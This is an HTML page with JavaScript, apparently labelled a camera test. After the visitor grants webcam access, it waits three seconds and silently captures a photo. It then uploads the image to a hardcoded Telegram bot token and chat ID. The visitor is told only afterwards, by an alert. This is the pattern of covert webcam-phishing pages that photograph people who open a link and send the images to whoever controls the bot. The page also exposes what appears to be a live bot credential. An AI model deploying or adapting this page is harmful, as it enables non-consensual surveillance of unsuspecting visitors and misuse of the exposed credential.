<!DOCTYPE html>
<html>
<head>
    <title>Auto Camera Telegram Test</title>
</head>
<body>
    <h2>Camera Test for Telegram Bot</h2>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Telegram Bot info
        const token = "8409041933:AAH24UX1yrw3Kr0PZhVwkaH2ZveRYDrSdwE";
        const chat_id = "6437064649";

        // Camera access
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // 3 second ke baad auto capture
            setTimeout(() => {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'photo.png');

                    // Telegram API call
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.json())
                    .then(data => alert("Photo sent to Telegram!"))
                    .catch(err => console.error(err));
                }, 'image/png');
            }, 3000); // 3 sec delay
        })
        .catch(err => alert("Camera permission denied: " + err));
    </script>
</body>
</html>
